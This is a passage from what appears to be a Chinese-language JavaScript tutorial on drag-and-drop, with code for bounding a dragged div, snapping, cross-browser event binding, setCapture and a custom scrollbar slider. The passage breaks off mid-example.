<li>直接给document加事件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">document.onmouseup=function ()</span><br><span class="line">&#123;</span><br><span class="line">	document.onmousemove=null;</span><br><span class="line">	document.onmouseup=null;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="ff下空div拖拽bug">FF下，空Div拖拽Bug</span></h4><ul>
<li>阻止默认事件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">oDiv.onmousedown=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">	disY=oEvent.clientY-oDiv.offsetTop;</span><br><span class="line">	</span><br><span class="line">	document.onmousemove=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</span><br><span class="line">		oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	document.onmouseup=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		document.onmousemove=null;</span><br><span class="line">		document.onmouseup=null;</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	return false;  //阻止默认事件</span><br><span class="line">&#125;;  //拖拽从onmousedown开始</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="防止拖出页面">防止拖出页面</span></h4><ul>
<li>修正位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	var disY=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">		disY=oEvent.clientY-oDiv.offsetTop;</span><br><span class="line">		</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			var t=oEvent.clientY-disY;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;0)  //小于0时直接等于0</span><br><span class="line">			&#123;</span><br><span class="line">				l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;document.documentElement.clientWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=document.documentElement.clientWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			if(t&lt;0)   同理</span><br><span class="line">			&#123;</span><br><span class="line">				t=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(t&gt;document.documentElement.clientHeight-oDiv.offsetHeight)</span><br><span class="line">			&#123;</span><br><span class="line">				t=document.documentElement.clientHeight-oDiv.offsetHeight;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			oDiv.style.top=t+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="js事件高级应用">JS事件高级应用</span></h1><h2><span id="事件绑定">事件绑定</span></h2><h3><span id="ie方式">IE方式</span></h3><ul>
<li>attachEvent(事件名称, 函数)，绑定事件处理函数   事件名带on</li>
<li>detachEvent(事件名称, 函数)，解除绑定<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//attachEvent(事件名， 函数)</span><br><span class="line">//IE</span><br><span class="line">/*</span><br><span class="line">oBtn.attachEvent(&apos;onclick&apos;, function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;a&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">oBtn.attachEvent(&apos;onclick&apos;, function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;b&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="dom-方式">DOM 方式</span></h3><ul>
<li>addEventListener(事件名, 函数, false)  事件名不带on</li>
<li>removeEventListener(事件名称, 函数, 捕获)</li>
</ul>
<h4><span id="火狐方式">火狐方式</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//FF</span><br><span class="line">//addEventListener(事件名, 函数, false)</span><br><span class="line">oBtn.addEventListener(&apos;click&apos;, function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;a&apos;);</span><br><span class="line">&#125;, false);</span><br><span class="line">oBtn.addEventListener(&apos;click&apos;, function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;b&apos;);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>
<h4><span id="兼容火狐-ie">兼容火狐、IE</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(oBtn.attachEvent)</span><br><span class="line">&#123;</span><br><span class="line">	oBtn.attachEvent(&apos;onclick&apos;, function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;a&apos;);</span><br><span class="line">	&#125;);</span><br><span class="line">	oBtn.attachEvent(&apos;onclick&apos;, function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;b&apos;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	oBtn.addEventListener(&apos;click&apos;, function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;a&apos;);</span><br><span class="line">	&#125;, false);</span><br><span class="line">	oBtn.addEventListener(&apos;click&apos;, function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;b&apos;);</span><br><span class="line">	&#125;, false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="兼容封装函数">兼容封装函数</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function myAddEvent(obj, ev, fn)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.attachEvent)</span><br><span class="line">	&#123;</span><br><span class="line">		obj.attachEvent(&apos;on&apos;+ev, fn);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		obj.addEventListener(ev, fn, false);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	myAddEvent(oBtn, &apos;click&apos;, function ()&#123;</span><br><span class="line">		alert(&apos;a&apos;);</span><br><span class="line">	&#125;);</span><br><span class="line">	</span><br><span class="line">	myAddEvent(oBtn, &apos;click&apos;, function ()&#123;</span><br><span class="line">		alert(&apos;b&apos;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2><span id="高级拖拽-1">高级拖拽-1</span></h2><h3><span id="限制范围">限制范围</span></h3><h4><span id="对位置进行判断">对位置进行判断</span></h4><ul>
<li>例子：不能拖出指定对象的Div<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var l=oEvent.clientX-disX;</span><br><span class="line">	var t=oEvent.clientY-disY;</span><br><span class="line">	</span><br><span class="line">	if(l&lt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		l=0;</span><br><span class="line">	&#125;</span><br><span class="line">	else if(l&gt;oDiv2.offsetWidth-oDiv.offsetWidth)  //限制范围时用到div的宽度</span><br><span class="line">	&#123;</span><br><span class="line">		l=oDiv2.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if(t&lt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		t=0;</span><br><span class="line">	&#125;</span><br><span class="line">	else if(t&gt;oDiv2.offsetHeight-oDiv.offsetHeight)</span><br><span class="line">	&#123;</span><br><span class="line">		t=oDiv2.offsetHeight-oDiv.offsetHeight;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=t+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>####　磁性吸附</p>
<ul>
<li>修改legth的大小判断条件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			var t=oEvent.clientY-disY;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;50)  //修改legth的大小判断条件</span><br><span class="line">			&#123;</span><br><span class="line">				l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;oDiv2.offsetWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=oDiv2.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			if(t&lt;50)</span><br><span class="line">			&#123;</span><br><span class="line">				t=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(t&gt;oDiv2.offsetHeight-oDiv.offsetHeight)</span><br><span class="line">			&#123;</span><br><span class="line">				t=oDiv2.offsetHeight-oDiv.offsetHeight;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			oDiv.style.top=t+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="高级拖拽-2">高级拖拽-2</span></h2><h3><span id="图片拖拽">图片拖拽</span></h3><ul>
<li>阻止默认事件<h3><span id="文字选中">文字选中</span></h3></li>
<li>阻止默认事件</li>
<li>IE下拖动有问题</li>
</ul>
<h4><span id="事件捕获">事件捕获</span></h4><ul>
<li>setCapture()     开启捕获</li>
<li>releaseCapture() 释放捕获</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	var disY=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">		disY=oEvent.clientY-oDiv.offsetTop;</span><br><span class="line">		</span><br><span class="line">		if(oDiv.setCapture)</span><br><span class="line">		&#123;</span><br><span class="line">			//IE</span><br><span class="line">			oDiv.onmousemove=mouseMove;</span><br><span class="line">			oDiv.onmouseup=mouseUp;</span><br><span class="line">			</span><br><span class="line">			oDiv.setCapture();</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			//Chrome、FF</span><br><span class="line">			document.onmousemove=mouseMove;</span><br><span class="line">			document.onmouseup=mouseUp;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function mouseMove(ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			var t=oEvent.clientY-disY;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			oDiv.style.top=t+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function mouseUp()</span><br><span class="line">		&#123;</span><br><span class="line">			this.onmousemove=null;</span><br><span class="line">			this.onmouseup=null;</span><br><span class="line">			</span><br><span class="line">			if(oDiv.releaseCapture)</span><br><span class="line">			&#123;</span><br><span class="line">				oDiv.releaseCapture();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">asdfasdfsdf&lt;br&gt;</span><br><span class="line">dfasfasdfasd</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;asdfasdfsdf&lt;br&gt;</span><br><span class="line">dfasfasdfasd&lt;/div&gt;</span><br><span class="line">asdfasdfsdf&lt;br&gt;</span><br><span class="line">dfasfasdfasd</span><br></pre></td></tr></table></figure>
<h3><span id="与dom配合">与DOM配合</span></h3><ul>
<li>带框的拖拽</li>
<li>保留原有位置的拖拽</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:100px; height:100px; background:yellow; position:absolute;&#125;</span><br><span class="line">.box &#123;border:1px dashed black; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	var disY=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">		disY=oEvent.clientY-oDiv.offsetTop;</span><br><span class="line">		</span><br><span class="line">		var oBox=document.createElement(&apos;div&apos;);</span><br><span class="line">		</span><br><span class="line">		oBox.className=&apos;box&apos;;</span><br><span class="line">		oBox.style.width=oDiv.offsetWidth-2+&apos;px&apos;;</span><br><span class="line">		oBox.style.height=oDiv.offsetHeight-2+&apos;px&apos;;</span><br><span class="line">		</span><br><span class="line">		oBox.style.left=oDiv.offsetLeft+&apos;px&apos;;</span><br><span class="line">		oBox.style.top=oDiv.offsetTop+&apos;px&apos;;</span><br><span class="line">		</span><br><span class="line">		document.body.appendChild(oBox);</span><br><span class="line">		</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			var t=oEvent.clientY-disY;</span><br><span class="line">			</span><br><span class="line">			oBox.style.left=l+&apos;px&apos;;</span><br><span class="line">			oBox.style.top=t+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=oBox.offsetLeft+&apos;px&apos;;</span><br><span class="line">			oDiv.style.top=oBox.offsetTop+&apos;px&apos;;</span><br><span class="line">			</span><br><span class="line">			document.body.removeChild(oBox);</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="自定义滚动条">自定义滚动条</span></h2><h3><span id="拖拽">拖拽</span></h3><ul>
<li>只有横向拖拽</li>
<li>限制范围——范围的大小</li>
<li>计算比例——当前值/最大值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</span><br><span class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var oParent=document.getElementById(&apos;parent&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">				</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;0)</span><br><span class="line">			&#123;</span><br><span class="line">				l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="控制其他对象">控制其他对象</span></h3><h4><span id="例子1控制物体的大小">例子1：控制物体的大小</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</span><br><span class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</span><br><span class="line">#div2 &#123;width:0px; height:0px; background:green;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</span><br><span class="line">	var oParent=document.getElementById(&apos;parent&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">				</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;0)</span><br><span class="line">			&#123;</span><br><span class="line">				